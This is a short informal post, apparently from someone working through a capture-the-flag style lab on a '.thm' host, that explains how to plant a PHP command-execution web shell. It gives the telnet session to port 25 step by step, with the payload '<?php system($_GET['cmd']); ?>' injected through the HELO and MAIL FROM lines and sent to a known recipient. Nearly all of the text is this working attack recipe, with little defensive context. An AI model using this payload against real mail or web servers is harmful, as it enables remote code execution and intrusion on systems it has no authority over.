this is a pretty basic php RCE shell i saw on some cool video, here's how to load it:

telnet thing.thm 25 (connecting to telnet)
HELO <?php system($_GET['cmd']); ?> (loading the command execution)
MAIL FROM:sm0key@<?php system($_GET['cmd']); ?> (doing something more with the mail)
RCPT TO: charles (this needs to be a known user inside of the recipient table)
DATA

then, press enter twice, 
then press full stop,

this took some time to get right, the php shell has to be perfect and you also need to watch out for input sanitisation.
